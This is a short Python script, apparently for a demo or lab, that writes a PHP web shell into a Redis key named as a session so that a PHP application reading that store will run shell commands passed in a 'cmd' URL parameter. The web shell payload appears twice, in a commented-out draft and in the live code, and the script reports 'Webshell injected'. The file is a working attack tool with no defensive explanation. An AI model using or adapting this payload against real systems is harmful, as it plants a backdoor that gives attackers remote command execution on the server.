# set_webshell_demo.py
#import redis

#r = redis.Redis(host='127.0.0.1', port=6379, db=0)  # adjust db if bootstrap.php uses another index

#payload = "<?php echo shell_exec($_GET['cmd'] ?? ''); ?>"
#r.set("session_webshell_demo", payload)

#print("Key set successfully")

import redis

# connect to the same Redis instance PHP is using
#r = redis.Redis(host='redis', port=6379, db=0)

r = redis.Redis(host='127.0.0.1', port=6379)

payload = "<?php echo shell_exec($_GET['cmd'] ?? ''); ?>"
r.set("session_webshell_demo", payload)

print("Webshell injected")
